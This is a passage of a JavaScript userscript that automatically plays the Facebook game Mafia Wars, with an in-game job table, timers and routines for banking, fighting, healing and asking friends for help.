    ['Concealable Camera', 'Smuggle Consumer Electronics for the Vory',MOSCOW],
    ['Dossier on Dmitri', 'Receive Vory Intel On Dmitri',MOSCOW],
    ['Dossier on Dmitri', 'Buy Mafiya Intel On Dmitri',MOSCOW],
    ['Ballistic Knife', 'Silence A Political Critic',MOSCOW],
    ['Severnyy Olen Snowbike', 'Extract A Favor From The Winner',MOSCOW],
    ['Set of Photos of Karpov', 'Kill An Investigative Reporter',MOSCOW],
    ['Photos of Karpov', 'Kill An Investigative Reporter',MOSCOW],
    ['Photos of Karpov', 'Catch Karpov Accepting A Bribe',MOSCOW],
    ['RAS-15', '"Convince" The Candidate To Withdraw',MOSCOW],
    ['Officer Corps Paycheck', 'Capitalize On An Officer\'s Gambling Problem',MOSCOW],
    ['Officer Corps Paycheck', 'Intercept The Base\'s Pay Shipment',MOSCOW],
    ['Bank Guard Uniform', 'Strip A Uniform Off The Corpse',MOSCOW],
    ['Bank Guard Uniform', '"Borrow" The Guard\'s Uniform After Releasing Him',MOSCOW],
    ['Stick of Dynamite', 'Sabotage The Plan From The Inside',MOSCOW],
    ['Stick of Dynamite','Stop The ULF Attack',MOSCOW],
    ['Mansion Details','Break Into An Architect\'s Office',MOSCOW],
    ['Mansion Details','Threaten A Mafiya Moneyman\'s Family',MOSCOW],
    ['Satellite Phone','Hijack A Boat Load Of Electronics',BANGKOK],
    ['Car Key Copy','Blackmail A Car Dealer',LV],
    ['Hot Tip','Help A Bookie Out Of A Jam ',LV],
    ['Alarm Code','Buy Some Black-Market Info',LV],
    ['Hotel Security Key Card','Swipe A Security Keycard',LV],
    ['Unwanted Evidence','Create A Diversion',LV],
    ['Severed Pinky','Intercept A Handoff In The Coliseum',ITALY],
    ['Rail Ticket','Track Down Don Adriano',ITALY],
    ['Smart Phone','Free A Professional Assassin',ITALY],
    ['Cooked Book','Blackmail A Track Official',ITALY],
    ['Hidden Charges','Snag A Lucrative Disposal Contract',ITALY],
    ['Set of Hidden Charges','Snag A Lucrative Disposal Contract',ITALY]
  );

  // Sort requirement jobs by level requirement, ascending
  requirementJob.sort(function(a, b) { return cities[a[2]][CITY_LEVEL] - cities[b[2]][CITY_LEVEL]; });

  // Business items
  var bizJobItems = new Array(
    ['Politico Corrupto', CUBA],
    ['Pirate', BANGKOK],
    ['Drug Shipment', BANGKOK]
  );

  String.prototype.trim = function()  { return this.replace(/^\s+|\s+$/g, ''); };
  String.prototype.ltrim = function() { return this.replace(/^\s+/, ''); };
  String.prototype.rtrim = function() { return this.replace(/\s+$/, ''); };
  String.prototype.untag = function() { return this.replace(/<[^>]*>/g, ''); };
  String.prototype.clean = function() { return this.replace(/<\/?[^>]+(>|$)/g, ''); };

  Array.prototype.searchArray = function(target, index) {
    // To use this method, "this" must be an array of arrays. Each array
    // contained in "this" has one of its elements (specified by the
    // "index" parameter) compared against the target parameter. An array
    // is returned that contains the indices of "this" in which a match
    // was found.
    //
    // NOTE: "target" can be a regular expression. If the array element
    //       is a string, it is compared for a pattern match.
    var returnArray = [];
    var checkArray = function (exp, item) {
      if (typeof(exp) == 'function' &&
          typeof(item) == 'string') {
        // Assume target is a regex to be matched against the string.
        if (target.test(item)) {
          return true;
        }
      } else if (item === exp) {
        return true;
      // Case insensitive checking
      } else if (typeof(exp) == 'string' && item.toLowerCase() == exp.toLowerCase()) {
        return true;
      }
      return false;
    };

    for (var i = 0, iLength = this.length; i<iLength; ++i) {
      if (typeof(this[i][index]) == 'object') {
        for (var j = 0, jLength = this[i][index].length; j < jLength; ++j) {
          if (checkArray(target, this[i][index][j])) {
            returnArray.push(i);
            break;
          }
        }
      } else if (checkArray(target, this[i][index])) {
        returnArray.push(i);
      }
    }
    return returnArray.length? returnArray : false;
  };

  // Array.unique() - Remove duplicate values
  Array.prototype.unique = function() {
    var a = [];
    var l = this.length;
    for (var i=0; i < l; ++i) {
      for (var j = i + 1; j < l; ++j) {
        // If this[i] is found later in the array
        if (this[i] === this[j])
          j = ++i;
      }
      a.push(this[i]);
    }
    return a;
  };

  // Check for missing settings.
  if (isGMUndefined('autoClick')) {
    saveDefaultSettings();
    addToLog('info Icon', 'If you want to perform jobs, fighting, and other actions automatically, please adjust your settings.');
  }

  // Check for a version change.
  if (GM_getValue('version') != SCRIPT.version) {
    GM_setValue('newversion', SCRIPT.version);
    sendMWValues(['version','newversion']);
    grabUpdateInfo();
    handleVersionChange();
  }


  // Load the missions array from previously saved value
  if (!isGMUndefined('missions')) {
    var savedMissions = eval ('(' + GM_getValue('missions') + ')');
    if (savedMissions.length == missions.length) {
      missions = savedMissions;
      DEBUG('Using saved missions array.');
    } else {
      DEBUG('Missions array updated.');
    }
  }


  // Set the initial run state.
  if (typeof GM_getValue('isRunning') != 'boolean') {
    alert('PS MWAP: Inconsistent state found in settings, please check them!');
    GM_setValue('isRunning', false);
  }
  running = GM_getValue('isRunning');

  var Reload = new Animate();
  Reload.desc = 'reload';
  var Autoplay = new Animate();
  Autoplay.desc = 'auto-play';
  Autoplay.fx = loadHome;

  // get saved attack/defense stats
  curAttack = GM_getValue('curAttack', undefined);
  curDefense = GM_getValue('curDefense', undefined);
  curAttackEquip = GM_getValue('curAttackEquip', undefined);
  curDefenseEquip = GM_getValue('curDefenseEquip', undefined);

  // Get player lists.
  var fightListInactive = new PlayerList('fightListInactive');
  var fightListActive   = new PlayerList('fightListActive');
  var fightListNew      = new PlayerList('fightListNew');
  var fightListAvoid    = new PlayerList('fightListAvoid');
  var giftList          = new PlayerList('giftList');

  // Choose sides (handling)
  chooseSides();

  // If the user has chosen to reset timers on startup
  if (isGMChecked('autoResetTimers')) {
    resetTimers();
  }

  // This line is optional, but it makes the menu display faster.
  refreshMWAPCSS();
  preloadMWAPImages();
  customizeMasthead();
  customizeLayout();
  customizeBanner();
  //update_nrg_stam();  //newchange // hhmmmmm killed it?

  // Add event listeners.
  setListenContent(true);
  setListenStats(true);

  // Make sure the modification timer goes off at least once.
  setModificationTimer();
  // Set timer for handlePopups(), interval at 2s.
  if (!popupTimer) popupTimer = window.setInterval(handlePopups, 1500);

  var initialized = true;

  // For chrome
  sendSettings();
  copyMWValues(['language', 'FBName', 'newRevList', 'oldRevList']);
  DEBUG('There are ' + missions.length + ' known missions.');
}

// Copy settings from background storage
function synchSettings() {
  copyMWValues(['language', 'FBName', 'newRevList', 'oldRevList']);
}

// Send settings to background storage
function sendSettings() {
  sendMWValues(['isRunning', 'autoLottoOpt', 'autoSecretStash','autoShareCoins','autoGlobalPublishing',
                'autoIcePublish', 'autoLevelPublish', 'autoAchievementPublish',
                'autoAskJobHelp', 'autoShareWishlist', 'autoWarRewardPublish','autoShareRewards',
                'autoWarResponsePublish', 'autoWarRallyPublish', 'autoWarPublish']);
}

function Animate() {
  this.TOUT = null;
  this.desc = '';
  this.fx = null;
  this.delay = null;
}

Animate.prototype.clearTimeout = function() {
  if (this.TOUT) {
    DEBUG('Clearing ' + this.desc + ' timer ' + this.TOUT + '.');
    clearTimeout(this.TOUT);
    this.TOUT = null;
  }
};

Animate.prototype.setTimeout = function(fx, delay) {
  this.clearTimeout();
  this.fx = fx;
  this.delay = delay;
  // Make the handler clear TOUT. This prevents attempts
  // to clear timers that have already gone off.
  var obj = this;
  this.TOUT = window.setTimeout(function () { if (obj) obj.TOUT = null; fx(); }, delay);
  DEBUG('Started ' + this.desc + ' timer ' + this.TOUT +
        ', delay=' + delay/1000 + ' sec.');
};

Animate.prototype.start = function() {
  if (running && settingsOpen === false && this.fx) {
    this.setTimeout(this.fx, this.delay);
  } else if (settingsOpen === true) {
    DEBUG('Settings box open. Not starting ' + this.desc + ' timer.');
  } else {
    DEBUG('Autoplayer paused. Not starting ' + this.desc + ' timer.');
  }
};

// Set up auto-reload (if enabled).
if (initialized) {
  autoReload(false, 'initiaized');
  if (!refreshGlobalStats()) {
    // Stop the script. (The timer will still go off and reload.)
    handleUnexpectedPage();
  } else {
    refreshSettings();
    if (GM_getValue('logOpen') == 'open') {
      showMafiaLogBox();
    }
  }
}

///////////////////////////////////////////////////////////////////////////////
//   End of top-level code. Automatic play is kicked off by doAutoPlay().    //
///////////////////////////////////////////////////////////////////////////////

function doAutoPlay () {
  var hasHome = level >= 6;
  var hasFight = level >= 5;
  var hasProps = level >= 4;
  var hasMarket = level >= 7;
  var hasMissions = level >= 12;
  // Set the default auto-play timer function and delay.
  Autoplay.fx = goHome;
  Autoplay.delay = getAutoPlayDelay();

  var previouslyIdle = idle;
  idle = false;

  // Determine whether a job and/or fight/hit could be attempted.
  var autoMissionif = running && !skipJobs && canMission();
  var autoStaminaSpendif = running && !skipStaminaSpend && canSpendStamina() && hasFight;
  var energyMaxed = (autoMissionif && energy >= maxEnergy);
  var staminaMaxed = (autoStaminaSpendif && stamina >= maxStamina);
  var maxed = energyMaxed || staminaMaxed;

  // Check if energy / stamina burning is prioritized
  if (isGMChecked('burnFirst')) {
    var spendFirst = GM_getValue('burnOption');
    // Prioritize using energy
    if (stamina < maxStamina && running && canMission() && spendFirst == BURN_ENERGY) {
      autoMissionif = true;
      autoStaminaSpendif = false;
    }
    // Prioritize using stamina
    if (energy < maxEnergy && running && canSpendStamina() && hasFight && spendFirst == BURN_STAMINA) {
      autoMissionif = false;
      autoStaminaSpendif = true;
    }
  }

  // Check if we tried firing the minipack
  if (GM_getValue('miniPackFired', false)) {
    GM_setValue('miniPackFired', false);
    // Fetch Toolbar Info
    grabToolbarInfo();
  }

  // Auto-bank
  var canBank = isGMChecked(cities[city][CITY_AUTOBANK]) && !suspendBank && quickBankFail &&
                cities[city][CITY_CASH] >= parseInt(GM_getValue(cities[city][CITY_BANKCONFG]));
  if (running && canBank) {
    if (autoBankDeposit(city, cities[city][CITY_CASH])) return;
  }

  // Click attack if on warNav
  if (running && onWarTab() && hasFight && isGMChecked('autoWarHelp')) {
    if (autoWarAttack()) return;
  }

  // Auto-war (limit to level 4 and above)
  if (running && !maxed && isGMChecked('autoWar') && hasFight && !timeLeftGM('warTimer')) {
    if (autoWar()) return;
  }

  // hasMissions now locked below 12
  if (running && isGMChecked('AutoMafiaMission') && hasMissions && (!timeLeftGM('colmissionTimer')) ) {
     if (Auto_Mafia_Mission() ) return;
  } else {
    Diagnose(' mission Timer '+parseInt(timeLeftGM('colmissionTimer'))+' Seconds. Perform Missions  '+isGMChecked('AutoMafiaMission')+', Level '+level) ;
//  Diagnose(' mission, has the ability to: '+ hasMissions +'. MWAP is running '+ running +'.');
  }

  // Collect Take first then Ask for Parts and then Build / Purchase
  // Auto-collect take (limit to level 4 and above)
  if (running && !maxed && hasProps && isGMChecked('collectTake' + cities[0][CITY_NAME])) {
    for (var i = 0, iLength = cities.length; i < iLength; ++i) {
      if (level >= cities[i][CITY_LEVEL] && !timeLeftGM('takeHour' + cities[i][CITY_NAME])) {
        // Collect take
        if (autoCollectTake(i)) return;
      }
    }
  }

  //Accept gifts from Message Center
  if (running && !maxed && ( isGMChecked('autoAcceptMsgGifts') || isGMChecked('autoAcceptMsgBoosts') )  && !timeLeftGM('autoAcceptMsgTimer')) {
    if (openMessageCenter()) return;
  }

  // Ask for Chop Shop Parts
  if (running && !maxed && isGMChecked('askShopParts')  && !timeLeftGM('askShopPartsTimer')) {
    if (askSpecialParts(NY, cityShopParts, GM_getValue('askShopPartsId',1), 11)) return;
  }

  // Ask for Weapons Depot Parts
  if (running && !maxed && isGMChecked('askDepotParts')  && !timeLeftGM('askDepotPartsTimer')) {
    if (askSpecialParts(NY, cityDepotParts, GM_getValue('askDepotPartsId',1), 12)) return;
  }

  // Ask for Armor Parts
  if (running && !maxed && isGMChecked('askArmorParts')  && !timeLeftGM('askArmorPartsTimer')) {
    if (askSpecialParts(NY, cityArmorParts, GM_getValue('askArmorPartsId',1), 13)) return;
  }

  // Ask for Zoo Parts
  if (running && !maxed && isGMChecked('askZooParts')  && !timeLeftGM('askZooPartsTimer')) {
    if (askSpecialParts(NY, cityZooParts, GM_getValue('askZooPartsId',1), 14)) return;
  }

  // Build Cars
  if (running && !maxed && isGMChecked('buildCar') && !timeLeftGM('buildCarTimer')) {
    if (buildItem(cityCars, GM_getValue('buildCarId',1), 11, NY)) return;
  }

  // Build Weapons
  if (running && !maxed && isGMChecked('buildWeapon') && !timeLeftGM('buildWeaponTimer')) {
    if (buildItem(cityWeapons, GM_getValue('buildWeaponId',1), 12, NY)) return;
  }

  // Build Armor
  if (running && !maxed && isGMChecked('buildArmor') && !timeLeftGM('buildArmorTimer')) {
    if (buildItem(cityArmor, GM_getValue('buildArmorId',1), 13, NY)) return;
  }

  // Build Animal
  if (running && !maxed && isGMChecked('buildAnimal') && !timeLeftGM('buildAnimalTimer')) {
    if (buildItem(cityAnimals, GM_getValue('buildAnimalId',1), 14, NY)) return;
  }

  // Ask for Casino Parts
  if (running && !maxed && isGMChecked('askCasinoParts')  && !timeLeftGM('askCasinoPartsTimer')) {
    if (askSpecialParts(LV, cityCasinoParts, GM_getValue('askCasinoPartsId',1), 1)) return;
  }

  // Build Port
  if (running && !maxed && isGMChecked('buildPort') && !timeLeftGM('buildPortTimer')) {
    if (buildItem(cityPort, GM_getValue('buildPortId',1), 14, ITALY)) return;
  }

  // Ask for Help on Moscow Tier
  if (running && !maxed && parseInt(GM_getValue('selectMoscowTier'))  && !timeLeftGM('AskforHelpMoscowTimer')) {
    if (AskforHelp(MOSCOW)) return;
  }

  // Player updates
  if (running && !maxed && isGMChecked('logPlayerUpdates') && onHome()) {
    if (autoPlayerUpdates()) return;
  }

  // Ask for help on Crew Collections
  if (running && !maxed && isGMChecked('autoAskHelponCC') && !timeLeftGM('autoAskHelponCCTimer')) {
    if (autoAskHelponCC()) return;
  }

  // Ask for Help on Vegas Tier
  if (running && !maxed && parseInt(GM_getValue('selectVegasTier'))  && !timeLeftGM('AskforHelpVegasTimer')) {
    if (AskforHelp(LV)) return;
  }

  // Auto-stat
  if (running && !maxed && stats > 0 && isGMChecked('autoStat') && !parseInt(GM_getValue('restAutoStat')) ) {
    if (autoStat()) return;
  }

  // Auto-lotto (limit to level 7 and above)
  if (running && !maxed && isGMChecked('autoLottoOpt') && hasMarket && !timeLeftGM('autoLottoTimer')) {
    if (autoLotto()) return;
  }

  // Auto-accept Mafia Invitations
  if (running && !maxed && invites > 0 && isGMChecked('acceptMafiaInvitations')) {
    if (autoAccept()) return;
  }

  // Ask for Help on Bangkok Tier
  if (running && !maxed && parseInt(GM_getValue('selectBangkokTier')) && !timeLeftGM('AskforHelpBangkokTimer')) {
    if (AskforHelp(BANGKOK)) return;
  }

  // Auto-Enforce title
  if (running && !maxed && GM_getValue('autoEnforcedTitle')!='' && !timeLeftGM('autoEnforcedTitleTimer')) {
    if (autoEnforce()) return;
  }

  // Ask for Help on Italy Tier
  if (running && !maxed && parseInt(GM_getValue('selectItalyTier')) && !timeLeftGM('AskforHelpItalyTimer')) {
    if (AskforHelp(ITALY)) return;
  }

  // Auto-Tournament
  if (running && isGMChecked('autoTournament') && !timeLeftGM('tournamentTimer') && (level >= cities[LV][CITY_LEVEL])) {  // && !maxed
    if (autoTournament()) return;
  }

  // auto-heal area
  if (running &&
      health < maxHealth &&
      isGMChecked('autoHeal') &&
      health < GM_getValue('healthLevel', 0) &&
      (stamina >= GM_getValue('stamina_min_heal')) &&
      canForceHeal()
      ) {
    if(canautoheal()) {
      DEBUG('auto-healing '); // hide/remove after testing
      if(quickHeal(false)) return;
    }
  } else {
//    DEBUG(' autoheal skipped in main loop ');
    //DEBUG('heal skipped, actual stamina:' + stamina +' stamina_Min_heal:'+ GM_getValue('stamina_min_heal') +  ' force heal:' + canForceHeal() );
    //DEBUG('heal skipped, current health:' + health + ' full:' + maxHealth + ' heal when health falls below:' + GM_getValue('healthLevel', 0) );
  }
  // Re-activating autoHeal in case you died and PS MWAP cleared the playerupdates before it could parse the snuffed message:
  if (running && health == 0 && !isGMChecked('autoHeal') && isGMChecked('logPlayerUpdates') && isGMChecked('hideAttacks')) {
    DEBUG('Re-activating autoHeal, seems you died while clearing the playerupdates!<br>Current HitXP: ' + GM_getValue('currentHitXp', 0));
    GM_setValue('autoHeal', 'checked');
  }

  // Background mode hitlisting (limit to level 4 and above)
  if (running && !maxed && autoStaminaSpendif && isGMChecked('bgAutoHitCheck') && !timeLeftGM('bgAutoHitTime')){
    if(autoHitlist()) return;
  }

  // Mini-pack check
  var xpPtsFromEnergy = (energy + 200) * getEnergyGainRate();
  var xpPtsFromStamina = (stamina + 200) * getStaminaGainRate();
  var canUseMiniPack = (xpPtsFromEnergy < ptsToNextLevel) && (xpPtsFromStamina < ptsToNextLevel);
  if (running && !maxed && canUseMiniPack && isGMChecked('checkMiniPack') && !timeLeftGM('miniPackTimer')) {
    if (miniPack()) return;
  }
  // TODO::::Auto-Energypack NewHome
  // Auto-energypack
  energyPackElt = xpathFirst('.//a[contains(@onclick, "xw_action=use_and_energy_all")]', innerPageElt);
  energyPackElt = energyPackElt ? energyPackElt : xpathFirst('.//a[contains(@onclick, "xw_action=use_energy_pak")]', innerPageElt);
  energyPack = (energyPackElt && onHome()) ? true : false;
  var energyCountdownElt = xpathFirst('.//div[contains(@id, "mbox_energy_timer_container")]', innerPageElt);
  if (energyCountdownElt) {
    if (energyCountdownElt.style.display == 'block') {
      energyPack = false;
    }
  }
  var ptsFromEnergyPack = maxEnergy * 1.25 * getEnergyGainRate();
  var ptsToLevelProjStaminaUse = ptsToNextLevel - stamina*getStaminaGainRate();
  var autoEnergyPackWaiting = running && energyPack &&
                              ptsFromEnergyPack <= ptsToLevelProjStaminaUse &&
                              isGMChecked('autoEnergyPack');

  if ((autoEnergyPackWaiting && (energy <= 2)) || (energyPack && isGMChecked('autoEnergyPackForce') && (energy <= GM_getValue('autoEnergyPackForcePts',0)))) {
    DEBUG('energyPack='+energyPack+'  energy='+energy+ '  ptsToNextLevel=' + ptsToNextLevel +
          '  ptsToLevelProjStaminaUse=' + ptsToLevelProjStaminaUse);
    if (autoEnergyPackWaiting) {
      addToLog('energyPack Icon', 'This energy pack should give you approximately ' + parseInt(ptsFromEnergyPack) + ' xp of your ' + parseInt(ptsToLevelProjStaminaUse) + ' projected remaining xp.' );
    }
    if (!energyPackElt){
      DEBUG('Cant find energy pack to click');
    } else {
      Autoplay.fx = function() {
        clickAction = 'energypack';
        clickElement(energyPackElt);
        DEBUG('Clicked to use energy pack');
      };
      Autoplay.start();
      return;
    }
  }

  //if we still have not found our mafia size, go get it
  mafia = GM_getValue('userMafiaSize', 0);
  if(!mafia) {
    if(getUserMafiaSize()) return;
  }

  // Do jobs or fight/hit. Give priority to spending stamina if it needs
  // to be burned and using one won't level up. Give priority to jobs if
  // within one stamina of leveling, or if an energy pack is waiting, or
  // if energy is fuller than stamina (in percentage terms)
  // Prioritize burning of energy if level-up within reach.
  if ((autoMissionif && SpendEnergy.canBurn) || (autoMissionif &&
       !(autoStaminaSpendif && SpendStamina.canBurn && ptsToNextLevel > 6) &&
       (ptsToNextLevel <= 6 || autoEnergyPackWaiting || energy/maxEnergy >= stamina/maxStamina))) {
    autoMission();
    return;
  }


  if (autoStaminaSpendif) {
    if (autoStaminaSpend()) return; // staminaspend is unchecked comes back false

    // Attempt failed. Randomize stamina setting (if set)
    if (isGMEqual('staminaSpendHow', STAMINA_HOW_RANDOM)) {
      randomizeStamina();
      if (autoStaminaSpend()) return;

    // Attempt failed. Let some other action happen before trying again
    } else {
      skipStaminaSpend = true;
    }
  }
  if (autoMissionif) {
    autoMission();
    return;
  }

  // If we reach this point, the script is considered to be idle. Anything the
  // script might do when there is nothing else to do should go below here.
  idle = true;

  // If not previously idle, check the home page.
  if (running && !previouslyIdle) {
    DEBUG('Now idle. Checking the home page.');
    Autoplay.fx = goHome;
    Autoplay.start();
    return;
  }

  // If fight/hit/jobs are being skipped, turn them back on and go to the home page
  if (running && (skipStaminaSpend || skipJobs)) {
    skipStaminaSpend = false;
    skipJobs = false;
    Autoplay.start();
    return;
  }

  // Idle in preferred city
  if (running && idle && isGMChecked('idleInCity') && city != GM_getValue('idleLocation', NY)) {
    DEBUG('Idling. Moving to ' + cities[GM_getValue('idleLocation', NY)][CITY_NAME] + '. ');
    Autoplay.fx = function(){goLocation(GM_getValue('idleLocation',NY));};
    Autoplay.delay = noDelay;
    Autoplay.start();
    return;
  }

  // Use the reload animate obj to kick off autoplay again
  autoReload(true, 'reload animate');
}
////////////////////////////////////////////// end of do auto play ///////////////////////////////////

function canautoheal() {
// DEBUG('in can auto heal - - 2 ');
  if(GM_getValue('staminaSpendHow') == STAMINA_HOW_FIGHTROB || GM_getValue('staminaSpendHow') == STAMINA_HOW_FIGHTRIVALS_ROB) {
    DEBUG(' STAMINA_HOW_FIGHTROB - STAMINA_HOW_FIGHTRIVALS_ROB blocked autoheal ');
    return false;
  }
  return true;
}

function getAutoPlayDelay() {
  return Math.floor(parseFloat(GM_getValue('d1', '3')) +
         parseFloat((GM_getValue('d2', '5')) -
         parseFloat(GM_getValue('d1', '3')))*Math.random())*1000;
}

function autoReload(forceReload,origin) {
  if (forceReload || isGMChecked('autoClick')) {
    Reload.fx    = function() {
      // Try the "nice" way first, but reload completely if that doesn't work.
      DEBUG('forced Page Reload from:' + origin);
      goHome();
      Reload.fx = loadHome;
      Reload.delay = 10000;
      Reload.start();
    };
    Reload.delay = Math.floor(parseFloat(GM_getValue('r1', '30')) +
                   parseFloat((GM_getValue('r2', '110')) -
                   parseFloat(GM_getValue('r1', '30')))*Math.random())*1000;
    Reload.start();
  }
}

function getUserMafiaSize() {
  if (!onMyMafiaNav()) {
    Autoplay.fx = goMyMafiaNav;
    Autoplay.start();
    return true;
  }

  var mafiaElt2 = xpathFirst('//div[(@class="tab_content") and (contains(.,"My Mafia"))]');
  if (mafiaElt2) {
    var mafiaElt3 = mafiaElt2.innerHTML.untag();
    mafia = parseInt(mafiaElt3.replace( /\D/g , "" ));
    Diagnose('test my mafia =' + mafia);
    GM_setValue('userMafiaSize', mafia);
  }

  if(!mafia){
    addToLog('warning Icon', 'BUG DETECTED: Unable to read mafia size.');
  }
  return;
}

function autoAccept() {
  // Load My Mafia
  if (!onMyMafiaNav()) {
    Autoplay.fx = goMyMafiaNav;
    Autoplay.start();
    return true;
  }

  // Get the "accept all" link.
  var elt = xpathFirst('.//a[contains(., "Accept All")]', innerPageElt);
  if (!elt) {
    DEBUG('Can\'t find accept link to click.');
    return true;
  } else {
    // Get the ajax link from the profile element
    var eltProfile = xpathFirst('//div[@class="nav_link profile_link"]//a[contains(.,"Profile")]');
    if (eltProfile) {
      elt.setAttribute('onclick',eltProfile.getAttribute('onclick')
        .replace(/xw_controller=stats/i,'xw_controller=recruit')
        .replace(/xw_action=view/i,'xw_action=accept&user_id=all&skip_req_frame=1')
      );
    }
  }

  // Accept all invitations.
  Autoplay.fx = function() {
    clickAction = 'accept';
    clickElement(elt);
    DEBUG('Clicked to accept.');
  };
  Autoplay.start();
  return true;
}

function openMessageCenter(){
  var MessageCenterCounter = document.getElementById('zmc_event_count');
  if(MessageCenterCounter){
    var MessageCenterLink = MessageCenterCounter.parentNode;
    if(MessageCenterLink){
      clickElement(MessageCenterLink);
      DEBUG('Clicked to open Message Center');
      setGMTime('autoAcceptMsgTimer', '4 hours');
      return true;
    } else {
      DEBUG('Message Center Link not found. Resetting Timer');
      setGMTime('autoAcceptMsgTimer', '1 hours');
    }
    return;
  }
}

function autoAskHelponCC(){
  // Common function
  var doAskFunction = function (askResult) {
    if (!askResult) {
      addToLog('warning Icon', 'Unable to Ask for Help on Crew Collections.  Resetting Timer for 4 hours.');
      setGMTime('autoAskHelponCCTimer', '4 hours');
    }
  };

  // Go to the Inventory tab.
  if (!onInventoryTab() && !onCollectionsTab()) {
    Autoplay.fx = function() { doAskFunction(goInventoryNav()); };
    Autoplay.start();
    return true;
  }

  if(!mafia){
    mafia = GM_getValue('userMafiaSize', 0);
    if(!mafia || mafia < 501){
      var mafiaSizeElt = xpathFirst('//div[@class="fightbar_group_stat"]//img[@title="Mafia Size"]').parentNode;
      if(mafiaSizeElt){
        var mafiaSize = parseInt(mafiaSizeElt.innerHTML.untag());
        if (mafiaSize){
          mafia = mafiaSize;
          GM_setValue('userMafiaSize', mafia);
          DEBUG('userMafiaSize updated to:'+mafia);
        }
      }
    }
  }

  // Go to the Collections tab.
  if (!onCollectionsTab()) {
    Autoplay.fx = function() { doAskFunction(goCollectionsNav()); };
    Autoplay.start();
    return true;
  }

  var helpButtons;
  var numButtons;

  helpButtons = $x('.//a[@class="sexy_button_new short white sexy_call_new" and contains(@onclick, "SocialCollection")]', innerPageElt);
  numButtons = helpButtons.length;

  if(numButtons>0){
    var askHelpFriends = xpathFirst('.//a[@class="sexy_button_new short white sexy_call_new" and contains(@onclick, "SocialCollection")]', innerPageElt);
    if (askHelpFriends) {
      DEBUG('Clicked to Ask for Help on Crew Collection.');
      clickAction = 'crew collection';
      clickElement(askHelpFriends);
    return true;
    }
  } else {
    DEBUG('No Help on Crew Collection buttons found. Resetting Timer for 4 hours.');
    setGMTime('autoAskHelponCCTimer', '4 hours');
  }
  return;
}

function AskforHelp(hlpCity) {
  Autoplay.delay = 3000;
  // Common function
  var doAskFunction = function (askResult) {
    if (!askResult) {
      addToLog('warning Icon', 'Unable to Ask for Help on ' + cities[helpCity][CITY_NAME] +' - '+ missionTabs[hlpCity][tabno - 1]+'. Please Check your \'Ask for Help\'-settings on PS MWAP\'s Mafia tab.');
      if(helpCity==MOSCOW) GM_setValue('selectMoscowTier', 0);
      if(helpCity==BANGKOK) GM_setValue('selectBangkokTier', 0);
      if(helpCity==LV) GM_setValue('selectVegasTier', 0);
      if(helpCity==ITALY) GM_setValue('selectItalyTier', 0);
    }
  };

  var helpCity = parseInt(hlpCity);
  var tabno=0;
  var tabnopath=0;
  var timerName='';

  DEBUG('AskforHelp - Looking for a Help Mission in '+helpCity +' : '+ cities[helpCity][CITY_NAME]);

  if(helpCity==MOSCOW) {
    tabno = parseInt(GM_getValue('selectMoscowTier'));
    timerName='AskforHelpMoscowTimer';
  } else if(helpCity==BANGKOK) {
    tabno = parseInt(GM_getValue('selectBangkokTier'));
    timerName='AskforHelpBangkokTimer';
  } else if(helpCity==LV) {
    jobno = parseInt(GM_getValue('selectVegasTier'));
    tabno = missions[jobno][MISSION_TAB];
    tabnopath   = missions[jobno][MISSION_TABPATH];
    timerName='AskforHelpVegasTimer';
  } else if(helpCity==ITALY) {
    jobno = parseInt(GM_getValue('selectItalyTier'));
    tabno = missions[jobno][MISSION_TAB];
    tabnopath   = missions[jobno][MISSION_TABPATH];
    timerName='AskforHelpItalyTimer';
  }

  DEBUG('AskforHelp - Travelling to '+helpCity +' : '+ cities[helpCity][CITY_NAME]);
  // Go to the correct city.
  if (city != helpCity) {
    Autoplay.fx = function() { goLocation(helpCity); };
    Autoplay.start();
    return true;
  }

  DEBUG('AskforHelp - Going to tabno '+tabno);
  // Go to the correct job tab.
  if (!onJobTab(tabno)) {
    Autoplay.fx = function() { doAskFunction(goJobTab(tabno)); };
    Autoplay.start();
    return true;
  }

  DEBUG('AskforHelp - Going to tabnopath '+tabnopath);
  // Go to the correct job tabnopath in LV / Italy
  if(helpCity == LV||helpCity==ITALY){
    if (!onJobTabpath(tabnopath)) {
      goJobTabPath(tabnopath);
    }
  }

  DEBUG('AskforHelp - Looking for the Help Button');

  if(helpCity==MOSCOW || helpCity==BANGKOK){
    if (/You must wait 24 hours/i.test(innerPageElt.innerHTML)) {
      addToLog('warning Icon', 'You must wait 24 hours before you can ask for help again in ' + cities[helpCity][CITY_NAME] +' - '+ missionTabs[hlpCity][tabno - 1]);
      setGMTime(timerName, '12 hours');
    } else {
      var askHelpFriends = xpathFirst('.//a[contains(., "Ask for Help")]', innerPageElt);
      if (askHelpFriends) {
        addToLog('info Icon', 'Clicked to Ask for Help in ' + cities[helpCity][CITY_NAME] +' - '+ missionTabs[hlpCity][tabno - 1]+'.');
        clickElement(askHelpFriends);
        setGMTime(timerName, '12 hours');
        return true;
      } else {
        addToLog('info Icon', 'You cannot Ask for Help yet in ' + cities[helpCity][CITY_NAME] +' - '+ missionTabs[hlpCity][tabno - 1]+'.');
        setGMTime(timerName, '2 hours');
      }
    }
  } else {
    addToLog('info Icon', 'Asking for help in ' + cities[helpCity][CITY_NAME]);
    var helpJobContainer = xpathFirst('.//div[@class="job_info" and contains(., "'+missions[jobno][MISSION_NAME]+'")]', innerPageElt);
    if(helpJobContainer){
      DEBUG('Jobcontainer ID: '+helpJobContainer.id);
      var helpButton = xpathFirst('.//a[@class="sexy_button_new medium white sexy_call_new ask_for_help"]', helpJobContainer);
      var helpButtonParent = xpathFirst('.//div[@class="ask_for_job_help_btn" and contains(@style,"display: none;")]', helpJobContainer);
      if(helpButtonParent){
        var helpTimer = xpathFirst('.//div[@id="ask_for_job_help_time"]', helpJobContainer).innerHTML;
        if(helpTimer) setGMTime(timerName, helptimer);
        else setGMTime(timerName, '2 hours');
      } else {
        if(helpButton){
          DEBUG('helpButton: '+helpButton.innerHTML);
          clickElement(helpButton);
          addToLog('info Icon', 'Clicked to Ask for Help in ' + cities[helpCity][CITY_NAME] +' - '+ missions[jobno][0]+'.');
          setGMTime(timerName, '8 hours');
        } else {
          setGMTime(timerName, '2 hours');
        }
      }
    } else {
      DEBUG('JobContainer for :'+missions[jobno][0]+' not FOUND!');
      setGMTime(timerName, '2 hours');
    }
  }
  return;
}

function askSpecialParts(itemCity, itemArray, itemIndex, buildType){
  if (city != itemCity) {
    Autoplay.fx = function() { goLocation(itemCity); };
    Autoplay.start();
    return true;
  }

  // Go to the city's property nav
  if (!onPropertyNav()) {
    Autoplay.fx = goPropertyNav;
    Autoplay.start();
    return true;
  }

  var elt;
  var timerName;
  var timerReset = '12 hours';
  var buildSetting;
